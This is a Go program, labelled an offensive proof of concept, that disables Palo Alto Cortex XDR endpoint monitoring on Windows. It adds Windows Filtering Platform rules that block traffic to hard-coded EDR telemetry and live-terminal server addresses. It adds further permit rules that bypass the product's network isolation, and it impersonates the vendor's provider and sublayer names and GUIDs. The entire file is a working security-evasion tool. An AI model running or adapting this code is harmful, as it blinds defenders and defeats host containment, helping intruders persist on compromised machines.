package main

import (
	"bufio"
	"fmt"
	"log"
	"net/netip"
	"os"

	"golang.org/x/sys/windows"
	"inet.af/wf"
)

func main() {
	// Create a new firewall rule
	fmt.Printf("[+] Starting Anti cortex XDR WFP\n")
	session, err := wf.New(&wf.Options{
		Name:    "XDR Offensive tool POC",
		Dynamic: true,
	})
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("[+] Created new Session name = XDR Offensive tool POC")

	//guidprovider, _ := windows.GenerateGUID()
	guidprovider, _ := windows.GUIDFromString("{4544A023-2767-411C-86E4-3EA52A4AA172}")
	providerID := wf.ProviderID(guidprovider)
	err = session.AddProvider(&wf.Provider{
		ID:         providerID,
		Name:       "Palo Alto Networks Corporation - Cortex XDR Network Isolation",
		Persistent: false,
	})
	if err != nil {
		fmt.Println(err)
		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of Provider ! Continuing still ...\n")
	} else {
		fmt.Println("[+] Adding Provider name = 'Palo Alto Networks Corporation - Cortex XDR Network Isolation' providerID = ", guidprovider, " Persistent = false")
	}
	guid, _ := windows.GUIDFromString("{849BDEF4-C2D5-4464-96E8-3CBE11841AD6}")

	//guid, _ := windows.GenerateGUID()
	sublayerID := wf.SublayerID(guid)

	err = session.AddSublayer(&wf.Sublayer{
		ID:       sublayerID,
		Name:     "Palo Alto Networks Corporation - Cortex XDR Network Isolation",
		Provider: providerID,
		Weight:   0xffff, // the highest possible weight

	})
	if err != nil {
		fmt.Println(err)
		fmt.Println("[!]  Seems you are in Isolation mode already !!! Failed creation of sublayer ! Continuing still ...\n")
	} else {
		fmt.Println("[+] Adding sublayer guid = ", guid, " name = Palo Alto Networks Corporation - Cortex XDR Network Isolation weight 0xffff")
	}
	layers := []wf.LayerID{
		//wf.LayerALEAuthRecvAcceptV4,
		//wf.LayerALEAuthConnectV4,
		wf.LayerALEAuthConnectV4,
		//wf.LayerOutboundTransportV4,

	}
	EDR_EU, err := netip.ParseAddr("34.102.140.103")
	if err != nil {
		panic(err)
	}
	EDR_DE, err := netip.ParseAddr("34.107.161.143")
	if err != nil {
		panic(err)
	}
	EDR_CH, err := netip.ParseAddr("34.149.180.250")
	if err != nil {
		panic(err)
	}
	LIVE_EU, err := netip.ParseAddr("35.244.251.25")
	if err != nil {
		panic(err)
	}
	LIVE_CH, err := netip.ParseAddr("34.65.213.226")
	if err != nil {
		panic(err)
	}
	LIVE_DE, err := netip.ParseAddr("34.107.61.141")
	if err != nil {
		panic(err)
	}

	for _, layer := range layers {
		guid, _ := windows.GenerateGUID()
		fmt.Println("[+] Adding WFP rule to block XDR EDR data logging and live terminal for EU,DE & CH guid = ", guid, " name = XDR_BLOCKING_RULE for layer = ", layer)
		err = session.AddRule(&wf.Rule{
			ID:         wf.RuleID(guid),
			Name:       "XDR_BLOCKING_RULE",
			Layer:      layer,
			Sublayer:   sublayerID,
			Provider:   providerID,
			Persistent: false, // no need to keep rule for next reboot
			HardAction: true,  //rule cannot be overriden except by a Veto
			Action:     wf.ActionBlock,
			Weight:     1000,
			Conditions: []*wf.Match{
				{
					Field: wf.FieldIPRemoteAddress,
					Op:    wf.MatchTypeEqual,
					Value: EDR_EU,
				},
				{
					Field: wf.FieldIPRemoteAddress,
					Op:    wf.MatchTypeEqual,
					Value: EDR_DE,
				},
				{
					Field: wf.FieldIPRemoteAddress,
					Op:    wf.MatchTypeEqual,
					Value: EDR_CH,
				},
				{
					Field: wf.FieldIPRemoteAddress,
					Op:    wf.MatchTypeEqual,
					Value: LIVE_EU,
				},
				{
					Field: wf.FieldIPRemoteAddress,
					Op:    wf.MatchTypeEqual,
					Value: LIVE_DE,
				},
				{
					Field: wf.FieldIPRemoteAddress,
					Op:    wf.MatchTypeEqual,
					Value: LIVE_CH,
				},
				{
					Field: wf.FieldIPRemotePort,
					Op:    wf.MatchTypeEqual,
					Value: uint16(443),
				},
				{
					Field: wf.FieldIPProtocol,
					Op:    wf.MatchTypeEqual,
					Value: wf.IPProtoTCP,
				},
			},
			/*Dst: &wf.NetInfo{
				IP:   net.ParseIP("1.2.3.4"),
				Port: 443,
			},
			Protocol: wf.TCP,*/
		})
		if err != nil {
			log.Print("ERROR: ", err)
		}
	}

	// bypassing the Isolation in case of
	isolationlayers := []wf.LayerID{
		wf.LayerALEAuthRecvAcceptV4,
		wf.LayerALEAuthConnectV4,
		wf.LayerALEAuthConnectV4,
		wf.LayerOutboundTransportV4,
	}

	for _, layer := range isolationlayers {
		guid, _ := windows.GenerateGUID()
		fmt.Println("[+] adding WFP rule to Allow rule to bypass ISOLATION guid = ", guid, " name = XDR_Isolate_bypass_RULE for layer = ", layer)
		err = session.AddRule(&wf.Rule{
			ID:         wf.RuleID(guid),
			Name:       "XDR_Isolate_bypass_RULE",
			Layer:      layer,
			Sublayer:   sublayerID,
			Provider:   providerID,
			Persistent: false, // no need to keep rule for next reboot
			HardAction: true,  //rule cannot be overriden except by a Veto
			Action:     wf.ActionPermit,
			Weight:     999,
			Conditions: []*wf.Match{
				{
					Field: wf.FieldIPProtocol,
					Op:    wf.MatchTypeEqual,
					Value: wf.IPProtoTCP,
				},
				{
					Field: wf.FieldIPProtocol,
					Op:    wf.MatchTypeEqual,
					Value: wf.IPProtoICMP,
				},
				{
					Field: wf.FieldIPProtocol,
					Op:    wf.MatchTypeEqual,
					Value: wf.IPProtoUDP,
				},
			},
		})
		if err != nil {
			log.Print("[!] ERROR: ", err)
		}
	}

	isolationICMPlayers := []wf.LayerID{
		wf.LayerOutboundICMPErrorV4,
		wf.LayerInboundICMPErrorV4,
	}

	for _, layer := range isolationICMPlayers {
		guid, _ := windows.GenerateGUID()
		fmt.Println("[+] Adding WFP rule to Allow ANY ICMPv4 guid = ", guid, " name = XDR_Isolate_bypass_ICMP_RULE for layer = ", layer)
		err = session.AddRule(&wf.Rule{
			ID:         wf.RuleID(guid),
			Name:       "XDR_Isolate_bypass_ICMP_RULE",
			Layer:      layer,
			Sublayer:   sublayerID,
			Provider:   providerID,
			Persistent: false, // no need to keep rule for next reboot
			HardAction: true,  //rule cannot be overriden except by a Veto
			Action:     wf.ActionPermit,
			Weight:     999,
		})
		if err != nil {
			log.Print("[!] ERROR: ", err)
		}
	}

	fmt.Println("==> Press ENTER to finish and remove tempory WFP rules...")
	reader := bufio.NewReader(os.Stdin)
	_, _ = reader.ReadString('\n')
	fmt.Println("[+] Finished")

}
